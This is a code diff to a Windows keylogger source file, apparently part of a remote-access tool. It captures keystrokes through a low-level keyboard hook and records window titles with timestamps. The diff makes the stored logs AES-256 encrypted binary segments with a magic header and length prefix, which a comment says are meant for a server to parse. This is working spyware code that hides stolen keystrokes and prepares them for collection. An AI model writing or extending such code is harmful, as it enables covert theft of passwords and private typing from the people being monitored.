@@ -1,9 +1,10 @@
 /**
  * remote_keylogger.c
- * Keylogging via WH_KEYBOARD_LL. Writes plain HTML to logs directory.
+ * Keylogging via WH_KEYBOARD_LL. Writes AES-256 encrypted HTML to logs directory.
  */
 #include "pch.h"
 #include "remote_keylogger.h"
+#include "remote_keylogger_aes.h"
 #include "remote_log.h"
 #include <stdlib.h>
 #include <string.h>
@@ -128,9 +129,12 @@ static void append_html(const char* s) {
 }
 
 static void append_key(const char* name) {
-    char line[128];
-    _snprintf_s(line, sizeof(line), _TRUNCATE, "<p class=\"h\">[%s]</p>", name);
+    char line[160];
+    _snprintf_s(line, sizeof(line), _TRUNCATE, "<span class=\"h\">[%s]</span>", name);
     append_html(line);
+    /* Only [Enter] and [Alt+Tab] start a new line; [Backspace] etc. do not. */
+    if (strcmp(name, "Enter") == 0 || strcmp(name, "Alt+Tab") == 0)
+        append_html("<br>");
 }
 
 static void append_char(char c) {
@@ -170,7 +174,7 @@ static void update_window_title(void) {
             }
             escaped[j] = '\0';
             _snprintf_s(line, sizeof(line), _TRUNCATE,
-                "<p class=\"h\"><br><br>[<b>%s - %02u:%02u:%02u UTC</b>]</p><br>",
+                "<span class=\"h\"><br><br>[<b>%s - %02u:%02u:%02u UTC</b>]</span><br>",
                 escaped, st.wHour, st.wMinute, st.wSecond);
             append_html(line);
         }
@@ -335,23 +339,55 @@ static void flush_to_disk(void) {
     SYSTEMTIME st;
     GetSystemTime(&st);
     char fname[MAX_PATH];
-    _snprintf_s(fname, sizeof(fname), _TRUNCATE, "%s\\%04u-%02u-%02u.html",
+    _snprintf_s(fname, sizeof(fname), _TRUNCATE, "%s\\%04u-%02u-%02u.bin",
         g_logs_dir, (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay);
-    int write_header = 0;
-    if (GetFileAttributesA(fname) == INVALID_FILE_ATTRIBUTES) write_header = 1;
-    FILE* f = NULL;
-    if (fopen_s(&f, fname, "a") != 0 || !f) {
-        HeapFree(GetProcessHeap(), 0, copy);
+
+    int write_header = (GetFileAttributesA(fname) == INVALID_FILE_ATTRIBUTES) ? 1 : 0;
+    size_t plain_len = len;
+    size_t header_len = 0;
+    char header[512];
+    if (write_header) {
+        header_len = (size_t)_snprintf_s(header, sizeof(header), _TRUNCATE,
+            "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on %04u-%02u-%02u %02u:%02u UTC<br><br>"
+            "<style>.h { color: 0000ff; display: inline; }</style>",
+            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay, (unsigned)st.wHour, (unsigned)st.wMinute);
+        plain_len += header_len;
+    }
+
+    /* Build plaintext for this segment only: [header if new file] + new chunk. No read-merge (append mode). */
+    char* plain = (char*)HeapAlloc(GetProcessHeap(), 0, plain_len + 1);
+    if (!plain) { HeapFree(GetProcessHeap(), 0, copy); return; }
+    if (write_header) { memcpy(plain, header, header_len); memcpy(plain + header_len, copy, len + 1); }
+    else { memcpy(plain, copy, len + 1); }
+    HeapFree(GetProcessHeap(), 0, copy);
+
+    size_t out_cap = KEYLOG_AES_HMAC_BYTES + KEYLOG_AES_IV_BYTES + ((plain_len / 16) + 1) * 16;
+    unsigned char* enc = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, out_cap);
+    if (!enc) { HeapFree(GetProcessHeap(), 0, plain); return; }
+    size_t enc_len = out_cap;
+    if (!keylog_aes_encrypt((const unsigned char*)plain, plain_len, enc, &enc_len)) {
+        HeapFree(GetProcessHeap(), 0, enc);
+        HeapFree(GetProcessHeap(), 0, plain);
         return;
     }
-    if (write_header) {
-        fprintf(f, "<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />Log created on %04u-%02u-%02u %02u:%02u UTC<br><br>",
-            (unsigned)st.wYear, (unsigned)st.wMonth, (unsigned)st.wDay, (unsigned)st.wHour, (unsigned)st.wMinute);
-        fprintf(f, "<style>.h { color: 0000ff; display: inline; }</style>");
+    HeapFree(GetProcessHeap(), 0, plain);
+
+    /* Append mode: [magic "KLS1"][4-byte length][segment]. Enables server to skip leading garbage. */
+    static const unsigned char seg_magic[4] = { 'K', 'L', 'S', '1' };
+    FILE* f = NULL;
+    if (fopen_s(&f, fname, "ab") != 0 || !f) {
+        HeapFree(GetProcessHeap(), 0, enc);
+        return;
     }
-    fwrite(copy, 1, len, f);
+    fwrite(seg_magic, 1, 4, f);
+    {
+        unsigned long seg_len = (unsigned long)enc_len;
+        if (seg_len != enc_len) { fclose(f); HeapFree(GetProcessHeap(), 0, enc); return; }
+        fwrite(&seg_len, 1, 4, f);
+    }
+    fwrite(enc, 1, enc_len, f);
     fclose(f);
-    HeapFree(GetProcessHeap(), 0, copy);
+    HeapFree(GetProcessHeap(), 0, enc);
 }
 
 static DWORD WINAPI keylogger_thread_proc(LPVOID param) {
